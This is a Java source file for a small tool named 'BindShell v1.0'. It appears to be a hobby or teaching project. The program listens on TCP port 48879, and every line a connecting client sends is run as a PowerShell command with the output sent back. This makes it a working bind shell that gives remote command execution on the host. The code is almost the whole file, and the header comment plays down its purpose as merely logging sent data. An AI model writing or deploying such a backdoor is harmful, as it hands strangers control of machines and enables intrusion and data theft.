/**
 * This program represents a server for the client to send data to
 * It logs everything sent in the console, it will continue to accept commands forever
 * 
 * It allows for multithreading as well
 * 
 * Author: Chris Shepard
 */

package bindshell;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class ShellServer {
    public static void main(String[] args) throws IOException {
        ServerSocket serverSocket = new ServerSocket(48879); //create the socket connection
        System.out.println("[+] Listening on " + serverSocket.getLocalPort());
        Socket client = serverSocket.accept();
        System.out.println("[+] Connection from " + client.getInetAddress().getHostAddress() + "::" + client.getPort());
        
        PrintWriter writer = new PrintWriter(client.getOutputStream());
        writer.println("Welcome to BindShell v1.0 - please type responsibly.");
        writer.flush();

        while(true){ //keep accepting commands, running the commands and send the output to the client
            BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));

            String input = reader.readLine();
    
            String command = "powershell.exe -Command \"& " + input + " \" ";
    
            Process process = Runtime.getRuntime().exec(command);
    
            Scanner fp = new Scanner(process.getInputStream());
    
            while(fp.hasNext()){
                String line = fp.nextLine();
                writer.println(line);
                writer.flush();
                System.out.println(line);
            }

            writer.println("endcom"); //lets the user know that it is the end of the output
            writer.flush();
            serverSocket.close();
        }
    }
}